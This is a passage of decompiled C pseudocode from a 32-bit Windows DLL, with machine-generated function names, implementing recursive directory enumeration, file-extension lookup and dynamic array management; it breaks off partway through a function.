//----- (10035DB8) --------------------------------------------------------
void __userpurge sub_10035DB8(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax
  int v3; // [esp+8h] [ebp-2Ch] BYREF
  int v4[2]; // [esp+Ch] [ebp-28h] BYREF
  int v5[5]; // [esp+14h] [ebp-20h] BYREF
  int v6; // [esp+30h] [ebp-4h]

  sub_1000D372(v4, a2);
  v6 = 0;
  sub_1000E111((int)v4);
  v3 = 0;
  v2 = sub_10036615(v5, (int)v4, &v3);
  LOBYTE(v6) = 1;
  (*(void (__thiscall **)(_DWORD *, _DWORD *))(a1[182] + 36))(a1 + 182, v2);
  LOBYTE(v6) = 0;
  sub_1000522C(v5);
  a1[11] = a1 + 20;
  a1[12] = 628;
  memset(a1 + 20, 0, 0x250u);
  a1[174] = 0;
  v6 = -1;
  sub_1000D3AD(v4);
}
// 10035DB8: using guessed type int var_20[5];

//----- (10035E78) --------------------------------------------------------
void __thiscall sub_10035E78(int this)
{
  *(_DWORD *)this = &off_10103844;
  if ( *(_DWORD *)(this + 76) )
  {
    FindClose(*(HANDLE *)(this + 76));
    *(_DWORD *)(this + 76) = 0;
  }
  sub_1000780D((void *)(this + 744));
  sub_100366A4((_DWORD *)(this + 728));
  sub_10008B27((int *)(this + 80));
  sub_100068A5((_DWORD *)(this + 56));
  sub_10030A22((_DWORD *)this);
}
// 10103844: using guessed type int (__thiscall *off_10103844)(void *Block, char);

//----- (10035F08) --------------------------------------------------------
int __thiscall sub_10035F08(int this, _DWORD *a2)
{
  size_t v3; // eax
  _DWORD *v4; // eax
  bool v5; // bl
  _DWORD *v6; // eax
  int v7; // ebx
  int *v8; // ecx
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  wchar_t *ExtensionW; // eax
  unsigned int v12; // eax
  bool v13; // zf
  _DWORD *v14; // eax
  int *v15; // ecx
  _DWORD *v16; // eax
  __int32 LastError; // eax
  void **v18; // ecx
  _DWORD *v19; // esi
  char v20; // al
  int v21; // ebx
  int v23; // eax
  int v24; // eax
  int v25; // eax
  int v26; // eax
  wchar_t *v27; // eax
  int v28; // eax
  int v29; // eax
  void **v30; // [esp+0h] [ebp-84h] BYREF
  void **v31; // [esp+4h] [ebp-80h]
  void *v32; // [esp+18h] [ebp-6Ch] BYREF
  int v33[2]; // [esp+1Ch] [ebp-68h] BYREF
  int v34[2]; // [esp+24h] [ebp-60h] BYREF
  int v35; // [esp+2Ch] [ebp-58h] BYREF
  LONG v36; // [esp+30h] [ebp-54h] BYREF
  int v37[2]; // [esp+34h] [ebp-50h] BYREF
  int v38[2]; // [esp+3Ch] [ebp-48h] BYREF
  int v39[2]; // [esp+44h] [ebp-40h] BYREF
  int v40[2]; // [esp+4Ch] [ebp-38h] BYREF
  _DWORD v41[4]; // [esp+54h] [ebp-30h] BYREF
  _DWORD v42[5]; // [esp+64h] [ebp-20h] BYREF
  int v43; // [esp+80h] [ebp-4h]

  v32 = (void *)2;
  memset(a2, 0, 8u);
  if ( *(_DWORD *)(this + 76) )
  {
    while ( *(_BYTE *)(this + 725) || FindNextFileW(*(HANDLE *)(this + 76), (LPWIN32_FIND_DATAW)(this + 80)) )
    {
      if ( sub_10030AAC(this) )
        return 4;
      if ( _wcsicmp((const wchar_t *)(this + 124), asc_1017674C) )
      {
        if ( *(_BYTE *)(this + 725) )
          *(_BYTE *)(this + 725) = 0;
        else
          ++*(_DWORD *)(this + 712);
        if ( _wcsicmp((const wchar_t *)(this + 124), L"..") )
        {
          if ( ++*(_DWORD *)(this + 720) >= 0x32u )
          {
            Sleep(0x64u);
            *(_DWORD *)(this + 720) = 0;
          }
          v3 = sub_1000D687(this + 672);
          v4 = sub_1000D836(1, this + 672, v37, v3 - 1);
          v43 = 0;
          v5 = sub_1000D65C((int)dword_10186B60, (int)v4) == 0;
          v43 = -1;
          sub_1000D3AD(v37);
          v31 = (void **)(this + 124);
          if ( v5 )
          {
            sub_1000D17D(v33, (wchar_t *)v31);
            v43 = 1;
            v6 = sub_1000D5FF(v38, this + 672, v33);
            LOBYTE(v43) = 2;
            v7 = this + 680;
            sub_10001236(v6 + 1, (LONG *)(this + 684));
            LOBYTE(v43) = 1;
            sub_1000D3AD(v38);
            v43 = -1;
            v8 = v33;
          }
          else
          {
            sub_1000D17D(v34, (wchar_t *)v31);
            v43 = 3;
            v9 = sub_1000D5FF(v40, this + 672, dword_10186B60);
            LOBYTE(v43) = 4;
            v10 = sub_1000D5FF(v39, (int)v9, v34);
            LOBYTE(v43) = 5;
            v7 = this + 680;
            sub_10001236(v10 + 1, (LONG *)(this + 684));
            LOBYTE(v43) = 4;
            sub_1000D3AD(v39);
            LOBYTE(v43) = 3;
            sub_1000D3AD(v40);
            v43 = -1;
            v8 = v34;
          }
          sub_1000D3AD(v8);
          ExtensionW = PathFindExtensionW((LPCWSTR)(this + 124));
          sub_1000D17D(&v35, ExtensionW);
          v43 = 6;
          sub_10001236(&v36, (LONG *)(this + 692));
          v43 = -1;
          sub_1000D3AD(&v35);
          if ( (*(_BYTE *)(this + 80) & 0x10) == 0 )
          {
            v23 = *(_DWORD *)(this + 72);
            *(_DWORD *)(this + 696) = v23;
            *(_DWORD *)(this + 72) = v23 + 1;
            sub_1003098B((_DWORD *)(this + 700), (_DWORD *)(this + 744));
            *a2 = *(_DWORD *)(this + 44);
            a2[1] = *(_DWORD *)(this + 48);
            return 0;
          }
          v12 = *(_DWORD *)(this + 716);
          if ( *(_DWORD *)(this + 708) > v12 )
          {
            v13 = *(_BYTE *)(this + 724) == 0;
            v32 = (void *)(v12 + 1);
            v31 = &v32;
            v30 = (void **)v7;
            if ( v13 )
            {
              v16 = sub_10036615(v42, (int)v30, v31);
              v43 = 8;
              (*(void (__thiscall **)(int, _DWORD *, _DWORD))(*(_DWORD *)(this + 728) + 32))(this + 728, v16, 0);
              v43 = -1;
              v15 = v42;
            }
            else
            {
              v14 = sub_10036615(v41, (int)v30, v31);
              v43 = 7;
              (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)(this + 728) + 36))(this + 728, v14);
              v43 = -1;
              v15 = v41;
            }
            sub_1000522C(v15);
          }
        }
      }
      else
      {
        *(_BYTE *)(this + 725) = 0;
      }
    }
    if ( *(_DWORD *)(this + 76) )
    {
      FindClose(*(HANDLE *)(this + 76));
      *(_DWORD *)(this + 76) = 0;
    }
    LastError = GetLastError();
    if ( LastError == 18 )
    {
      v32 = (void *)2;
      goto LABEL_27;
    }
    sub_10029BC2(LastError);
    v31 = v18;
    v30 = v18;
    v32 = &v30;
    sub_1000728E(&v30, 0);
    v43 = 9;
    v19 = (_DWORD *)dword_10182DE8;
    v20 = GetLastError();
    v43 = -1;
    sub_1004F7E6(v19, 200, v20, (int)v30, (int)v31);
    return 3;
  }
LABEL_27:
  v21 = this + 728;
  while ( (*(int (__thiscall **)(int))(*(_DWORD *)v21 + 4))(this + 728) )
  {
    v24 = *(_DWORD *)v21;
    v31 = 0;
    *(_DWORD *)(this + 712) = 0;
    v25 = (*(int (__thiscall **)(int, void **))(v24 + 44))(this + 728, v31);
    if ( !PathIsDirectoryW(*(LPCWSTR *)(*(_DWORD *)(v25 + 8) + 12)) )
      return sub_100363B4(this, a2);
    v26 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v21 + 44))(this + 728, 0);
    if ( sub_1002EDC4(this + 56, v26 + 4) )
    {
      v27 = (wchar_t *)sub_1000CC40((int)&unk_10176758);
      sub_1000D17D(&v35, v27);
      v43 = 10;
      v28 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v21 + 44))(this + 728, 0);
      sub_1000D5FF(v33, v28 + 4, &v35);
      LOBYTE(v43) = 12;
      sub_1000D3AD(&v35);
      *(_DWORD *)(this + 76) = FindFirstFileW(*(LPCWSTR *)(v33[1] + 12), (LPWIN32_FIND_DATAW)(this + 80));
      v29 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v21 + 44))(this + 728, 0);
      sub_10001236((LONG *)(v29 + 8), (LONG *)(this + 676));
      *(_DWORD *)(this + 716) = *(_DWORD *)((*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v21 + 44))(this + 728, 0)
                                          + 12);
      (*(void (__thiscall **)(int, _DWORD))(*(_DWORD *)v21 + 40))(this + 728, 0);
      if ( *(_DWORD *)(this + 76) != -1 )
      {
        *(_BYTE *)(this + 725) = 1;
        v32 = 0;
        v43 = -1;
        sub_1000D3AD(v33);
        return (int)v32;
      }
      *(_DWORD *)(this + 76) = 0;
      v43 = -1;
      sub_1000D3AD(v33);
    }
    else
    {
      (*(void (__thiscall **)(int, _DWORD))(*(_DWORD *)v21 + 40))(this + 728, 0);
    }
  }
  return (int)v32;
}
// 100361EA: variable 'v18' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 10186B60: using guessed type _DWORD dword_10186B60[2];
// 10035F08: using guessed type _DWORD var_30[4];
// 10035F08: using guessed type _DWORD var_20[5];

//----- (100363B4) --------------------------------------------------------
int __userpurge sub_100363B4@<eax>(int a1@<ebx>, _DWORD *a2)
{
  int v2; // edi
  int v3; // eax
  int v4; // eax
  HANDLE FirstFileW; // eax
  int v6; // eax
  WCHAR *v7; // eax
  int v8; // eax
  int v9; // eax
  size_t v10; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  int *v13; // ecx
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  wchar_t *ExtensionW; // eax
  int v17; // eax
  int v18; // eax
  int v19; // ecx
  _DWORD v21[2]; // [esp+10h] [ebp-2Ch] BYREF
  int v22[2]; // [esp+18h] [ebp-24h] BYREF
  int v23; // [esp+20h] [ebp-1Ch] BYREF
  LONG v24; // [esp+24h] [ebp-18h] BYREF
  int v25; // [esp+28h] [ebp-14h]
  bool v26; // [esp+2Fh] [ebp-Dh]
  int v27; // [esp+38h] [ebp-4h]

  v2 = a1 + 728;
  v3 = *(_DWORD *)(a1 + 728);
  v25 = a1 + 728;
  v4 = (*(int (__thiscall **)(int, _DWORD))(v3 + 44))(a1 + 728, 0);
  FirstFileW = FindFirstFileW(*(LPCWSTR *)(*(_DWORD *)(v4 + 8) + 12), (LPWIN32_FIND_DATAW)(a1 + 80));
  *(_DWORD *)(a1 + 76) = FirstFileW;
  if ( FirstFileW == (HANDLE)-1 )
  {
    *(_DWORD *)(a1 + 76) = 0;
  }
  else
  {
    v6 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v2 + 44))(a1 + 728, 0);
    v7 = (WCHAR *)sub_1000D679((LONG *)(v6 + 4));
    PathRemoveFileSpecW(v7);
    v8 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v2 + 44))(a1 + 728, 0);
    sub_1000D6AC(v8 + 4);
    v9 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v2 + 44))(a1 + 728, 0);
    sub_10001236((LONG *)(v9 + 8), (LONG *)(a1 + 676));
    v10 = sub_1000D687(a1 + 672);
    v11 = sub_1000D836(1, a1 + 672, &v23, v10 - 1);
    v27 = 0;
    v26 = sub_1000D65C((int)dword_10186B60, (int)v11) == 0;
    v27 = -1;
    sub_1000D3AD(&v23);
    sub_1000D17D(&v23, (wchar_t *)(a1 + 124));
    if ( v26 )
    {
      v27 = 1;
      v12 = sub_1000D5FF(v22, a1 + 672, &v23);
      LOBYTE(v27) = 2;
      sub_10001236(v12 + 1, (LONG *)(a1 + 684));
      LOBYTE(v27) = 1;
      v13 = v22;
    }
    else
    {
      v27 = 3;
      v14 = sub_1000D5FF(v21, a1 + 672, dword_10186B60);
      LOBYTE(v27) = 4;
      v15 = sub_1000D5FF(v22, (int)v14, &v23);
      LOBYTE(v27) = 5;
      sub_10001236(v15 + 1, (LONG *)(a1 + 684));
      LOBYTE(v27) = 4;
      sub_1000D3AD(v22);
      LOBYTE(v27) = 3;
      v13 = v21;
    }
    sub_1000D3AD(v13);
    v27 = -1;
    sub_1000D3AD(&v23);
    ExtensionW = PathFindExtensionW((LPCWSTR)(a1 + 124));
    sub_1000D17D(&v23, ExtensionW);
    v27 = 6;
    sub_10001236(&v24, (LONG *)(a1 + 692));
    v27 = -1;
    sub_1000D3AD(&v23);
    v17 = *(_DWORD *)(a1 + 72);
    *(_DWORD *)(a1 + 696) = v17;
    *(_DWORD *)(a1 + 72) = v17 + 1;
    sub_1003098B((_DWORD *)(a1 + 700), (_DWORD *)(a1 + 744));
    v18 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v25 + 44))(v25, 0);
    v19 = *(_DWORD *)(a1 + 44);
    v2 = v25;
    *(_DWORD *)(a1 + 716) = *(_DWORD *)(v18 + 12);
    *a2 = v19;
    a2[1] = *(_DWORD *)(a1 + 48);
  }
  (*(void (__thiscall **)(int, _DWORD))(*(_DWORD *)v2 + 40))(v2, 0);
  return 0;
}
// 10186B60: using guessed type _DWORD dword_10186B60[2];
// 100363B4: using guessed type _DWORD var_2C[2];

//----- (100365A5) --------------------------------------------------------
void __thiscall sub_100365A5(_DWORD *this, int a2, int a3)
{
  sub_1003098B(this + 186, &a2);
  sub_1000780D(&a2);
}

//----- (100365D6) --------------------------------------------------------
_DWORD *__thiscall sub_100365D6(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // eax
  volatile LONG *v3; // ecx

  v2 = this + 186;
  v3 = (volatile LONG *)this[187];
  a2[1] = v3;
  *a2 = *v2;
  InterlockedIncrement(v3);
  return a2;
}

//----- (10036615) --------------------------------------------------------
_DWORD *__stdcall sub_10036615(_DWORD *a1, int a2, _DWORD *a3)
{
  *a1 = off_100FBFBC;
  sub_1000D372(a1 + 1, a2);
  a1[3] = *a3;
  return a1;
}
// 100FBFBC: using guessed type int (__thiscall *off_100FBFBC[2])(void *, char);

//----- (10036650) --------------------------------------------------------
int *__thiscall sub_10036650(int *this, int *a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (void (__thiscall ***)(_DWORD, int))this[3];
    if ( v3 )
    {
      if ( *(v3 - 1) )
        (**v3)(v3, 3);
      else
        j__free(v3 - 1);
    }
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (100366A4) --------------------------------------------------------
void __thiscall sub_100366A4(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = &off_101037E8;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  this[3] = 0;
  sub_10039F05(this);
}
// 101037E8: using guessed type int (__thiscall *off_101037E8)(void *Block, char);

//----- (10036707) --------------------------------------------------------
void __thiscall sub_10036707(_DWORD *this, int a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int v7; // eax
  int v8; // ecx
  int v9; // edi
  bool v10; // zf
  int v11; // ebx
  int (__thiscall **v12)(void *, char); // [esp+10h] [ebp-1Ch] BYREF
  int v13; // [esp+14h] [ebp-18h] BYREF
  LONG v14; // [esp+18h] [ebp-14h] BYREF
  int v15; // [esp+1Ch] [ebp-10h]
  int v16; // [esp+28h] [ebp-4h]
  int v17; // [esp+34h] [ebp+8h]
  int v18; // [esp+38h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10135676);
  v12 = off_100FBFBC;
  sub_1000D372(&v13, a2 + 4);
  v16 = 0;
  v15 = *(_DWORD *)(a2 + 12);
  v16 = 1;
  v5 = *this;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  v7 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v7 > a3 )
  {
    v8 = 16 * v7;
    v18 = 16 * v7;
    v17 = v7 - a3;
    while ( 1 )
    {
      v9 = this[3] + v8;
      sub_10001236((LONG *)(v9 - 8), (LONG *)(v9 + 8));
      v18 -= 16;
      v10 = v17-- == 1;
      *(_DWORD *)(v9 + 12) = *(_DWORD *)(v9 - 4);
      if ( v10 )
        break;
      v8 = v18;
    }
  }
  v11 = this[3] + 16 * a3;
  sub_10001236(&v14, (LONG *)(v11 + 8));
  *(_DWORD *)(v11 + 12) = v15;
  ++this[1];
  v16 = -1;
  sub_1000522C((int *)&v12);
}
// 100FBFBC: using guessed type int (__thiscall *off_100FBFBC[2])(void *, char);

//----- (100367CF) --------------------------------------------------------
int __thiscall sub_100367CF(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  unsigned int v4; // ebp
  int v5; // ebx
  LONG *v6; // edi
  int v7; // edi

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10135677);
  v3 = *this;
  --this[1];
  v4 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v5 = 16 * a2;
    do
    {
      v6 = (LONG *)(this[3] + v5);
      sub_10001236(v6 + 6, v6 + 2);
      v6[3] = v6[7];
      ++v4;
      v5 += 16;
    }
    while ( v4 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v7 = this[3] + 16 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_10001236(&dword_10193B7C, (LONG *)(v7 + 8));
  *(_DWORD *)(v7 + 12) = dword_10193B80;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193B7C: using guessed type LONG dword_10193B7C;
// 10193B80: using guessed type int dword_10193B80;

//----- (10036851) --------------------------------------------------------
int __thiscall sub_10036851(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101356A6);
  return this[3] + 16 * a2;
}

//----- (10036870) --------------------------------------------------------
int __thiscall sub_10036870(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101356A7);
  return this[3] + 16 * a2;
}

//----- (1003688F) --------------------------------------------------------
int __thiscall sub_1003688F(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // ebx
  int v5; // edi
  int v6; // eax
  unsigned int v8; // [esp+8h] [ebp-4h]

  v2 = a2;
  v8 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 16 * a2;
    do
    {
      v5 = v4 + this[3];
      sub_10001236(&dword_10193B7C, (LONG *)(v5 + 8));
      ++v8;
      *(_DWORD *)(v5 + 12) = dword_10193B80;
      v4 += 16;
    }
    while ( v8 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    v2 = a2;
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v6 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v6 + 88))(this);
}
// 10193B7C: using guessed type LONG dword_10193B7C;
// 10193B80: using guessed type int dword_10193B80;

//----- (100368F2) --------------------------------------------------------
unsigned int __thiscall sub_100368F2(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101357BA);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 16;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (1003696E) --------------------------------------------------------
unsigned int __thiscall sub_1003696E(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v10; // eax
  unsigned int result; // eax
  LONG *v12; // ebx
  LONG *v13; // edi
  unsigned int v14; // [esp+24h] [ebp+8h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 28 != 0 ? -1 : 16 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      0x10u,
      v5,
      (void (__thiscall *)(void *))sub_10008066,
      (void (__thiscall *)(void *))sub_1000522C);
  }
  v14 = 0;
  this[1] = a2;
  v10 = *this;
  this[3] = v8;
  result = (*(int (__thiscall **)(_DWORD *))(v10 + 4))(this);
  if ( result )
  {
    v12 = (LONG *)(a3 + 12);
    do
    {
      v13 = (LONG *)((char *)v12 + -12 - a3 + this[3]);
      sub_10001236(v12 - 1, v13 + 2);
      ++v14;
      v13[3] = *v12;
      v12 += 4;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v14 < result );
  }
  return result;
}

//----- (10036A2F) --------------------------------------------------------
void __thiscall sub_10036A2F(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void (__thiscall ***v6)(_DWORD, int); // edi
  int v7; // ecx
  int *v8; // eax
  _DWORD *v9; // ebx
  LONG *v10; // ebx
  LONG *v11; // edi
  char *i; // eax
  char *v13; // [esp+14h] [ebp-1Ch]
  unsigned int v14; // [esp+18h] [ebp-18h]
  _DWORD *v15; // [esp+1Ch] [ebp-14h]
  int v16; // [esp+20h] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v16 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v16 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void (__thiscall ***)(_DWORD, int))this[3];
    v13 = (char *)v6;
    v7 = (unsigned __int64)(unsigned int)v16 >> 28 != 0 ? -1 : 16 * v16;
    v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
    if ( v8 )
    {
      v9 = v8 + 1;
      *v8 = v16;
      `eh vector constructor iterator'(
        v8 + 1,
        0x10u,
        v16,
        (void (__thiscall *)(void *))sub_10008066,
        (void (__thiscall *)(void *))sub_1000522C);
      v15 = v9;
    }
    else
    {
      v15 = 0;
    }
    v14 = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v10 = (LONG *)(v6 + 3);
      v11 = v15 + 2;
      for ( i = (char *)(v13 - (char *)v15); ; i = (char *)(v13 - (char *)v15) )
      {
        sub_10001236((LONG *)&i[(_DWORD)v11], v11);
        ++v14;
        v11[1] = *v10;
        v10 += 4;
        v11 += 4;
        if ( v14 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
      }
      v6 = (void (__thiscall ***)(_DWORD, int))v13;
    }
    this[3] = v15;
    if ( v6 )
    {
      if ( *(v6 - 1) )
        (**v6)(v6, 3);
      else
        j__free(v6 - 1);
    }
    this[2] = v16;
  }
}

//----- (10036B58) --------------------------------------------------------
_DWORD *__thiscall sub_10036B58(_DWORD *Block, char a2)
{
  sub_100366A4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10036B74) --------------------------------------------------------
void __usercall sub_10036B74(_DWORD *a1@<edi>)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // eax

  v1 = 0;
  a1[1] = 0;
  a1[2] = 16;
  v2 = operator new(0x104u);
  if ( v2 )
  {
    v1 = v2 + 1;
    *v2 = 16;
    `eh vector constructor iterator'(
      v2 + 1,
      0x10u,
      16,
      (void (__thiscall *)(void *))sub_10008066,
      (void (__thiscall *)(void *))sub_1000522C);
  }
  a1[3] = v1;
}

//----- (10036BDB) --------------------------------------------------------
char __thiscall sub_10036BDB(_DWORD *this, int a2)
{
  char v2; // bl
  _DWORD *v3; // eax
  void *v5[3]; // [esp+Ch] [ebp-18h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(_DWORD *, void **))(this[3] + 12))(this + 3, v5);
  v2 = 0;
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v5[0] + 12))(v5[0]);
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD, int))(*(_DWORD *)*v3 + 4))(*v3, a2) )
    {
      v2 = 1;
      break;
    }
    sub_10042AAB((int)v5[0]);
  }
  v6 = -1;
  sub_1003406C(v5);
  return v2;
}

//----- (10036C70) --------------------------------------------------------
void *__thiscall sub_10036C70(int this)
{
  *(_DWORD *)this = &off_10103860;
  sub_100403FE((void **)(this + 92));
  sub_100381BE((_DWORD *)(this + 44));
  sub_1000B3DF((int *)(this + 16));
  return sub_100201D0((_BYTE *)this);
}
// 10103860: using guessed type int (__thiscall *off_10103860)(void *Block, char);

//----- (10036CBF) --------------------------------------------------------
void *__thiscall sub_10036CBF(void *Block, char a2)
{
  sub_10036C70((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10036CDB) --------------------------------------------------------
void __thiscall sub_10036CDB(void *this)
{
  *(_DWORD *)this = off_1010390C;
  sub_10036C70((int)this + 156);
  sub_100119B4((_BYTE *)this + 136);
  sub_100403FE((void **)this + 32);
  sub_1000D3AD((int *)this + 29);
  sub_10038A58((_DWORD *)this + 20);
  sub_10038932((_DWORD *)this + 11);
  sub_100387C7((_DWORD *)this + 2);
}
// 1010390C: using guessed type int (__thiscall *off_1010390C[2])(void *Block, char);

//----- (10036D58) --------------------------------------------------------
void *__thiscall sub_10036D58(void *Block, char a2)
{
  sub_10036CDB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10036D74) --------------------------------------------------------
_DWORD *__fastcall sub_10036D74(void *a1, int a2, _DWORD *a3, _DWORD *a4, int a5)
{
  _DWORD *v6; // eax

  *a3 = off_1010385C;
  sub_10006814(a3 + 1);
  sub_1000809E(a4, a3 + 5);
  sub_1000B1F3(a1, (int)(a3 + 9), 0);
  a3[14] = a5;
  if ( (unsigned int)a1 <= 0xD )
  {
    v6 = sub_1000E7F7(&a4, 1, 0);
    sub_10007882((int)v6);
  }
  (*(void (__thiscall **)(_DWORD *, void *))(a3[1] + 36))(a3 + 1, &unk_10186BA0);
  (*(void (__thiscall **)(_DWORD *, void *))(a3[1] + 36))(a3 + 1, &unk_10186BB8);
  (*(void (__thiscall **)(_DWORD *, void *))(a3[1] + 36))(a3 + 1, &unk_10186B80);
  return a3;
}
// 1010385C: using guessed type int (__thiscall *off_1010385C[2])(void *Block, char);

//----- (10036E0F) --------------------------------------------------------
int *__thiscall sub_10036E0F(int *Block, char a2)
{
  sub_10036E2B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10036E2B) --------------------------------------------------------
void *__thiscall sub_10036E2B(int *this)
{
  *this = (int)off_1010385C;
  sub_1000B3DF(this + 9);
  sub_100068A5(this + 5);
  return sub_100068A5(this + 1);
}
// 1010385C: using guessed type int (__thiscall *off_1010385C[2])(void *Block, char);

//----- (10036E6F) --------------------------------------------------------
int __userpurge sub_10036E6F@<eax>(
        __int32 a1@<eax>,
        int a2@<ebp>,
        void *a3,
        void *a4,
        void *a5,
        int a6,
        void *a7,
        int a8)
{
  _DWORD *v8; // edi
  DWORD LastError; // eax
  int v10; // ecx
  volatile LONG **v11; // eax
  volatile LONG *v12; // ecx
  _DWORD *v13; // ecx
  int v14; // esi
  _DWORD *v15; // eax
  volatile LONG *v16; // ecx
  _DWORD *v17; // eax
  int v18; // esi
  _DWORD *v19; // eax
  _DWORD *v20; // eax
  LONG *v21; // eax
  char v22; // al
  volatile LONG **v23; // eax
  bool v24; // al
  int v25; // esi
  _DWORD *v26; // eax
  _DWORD *v27; // eax
  LONG *v28; // eax
  int v29; // esi
  _DWORD *v30; // eax
  _DWORD *v31; // eax
  LONG *v32; // eax
  char v33; // al
  int v34; // ebx
  DWORD v35; // eax
  int *v36; // eax
  bool v37; // zf
  int v38; // esi
  void *v39; // eax
  _DWORD *v41; // [esp-10h] [ebp-1BCh] BYREF
  _DWORD *v42; // [esp-Ch] [ebp-1B8h]
  volatile LONG **v43; // [esp-8h] [ebp-1B4h] BYREF
  int v44; // [esp-4h] [ebp-1B0h]

  *(_DWORD *)(a2 + 44) = 0;
  sub_10029BC2(a1);
  *(_DWORD *)(a2 + 60) = 0;
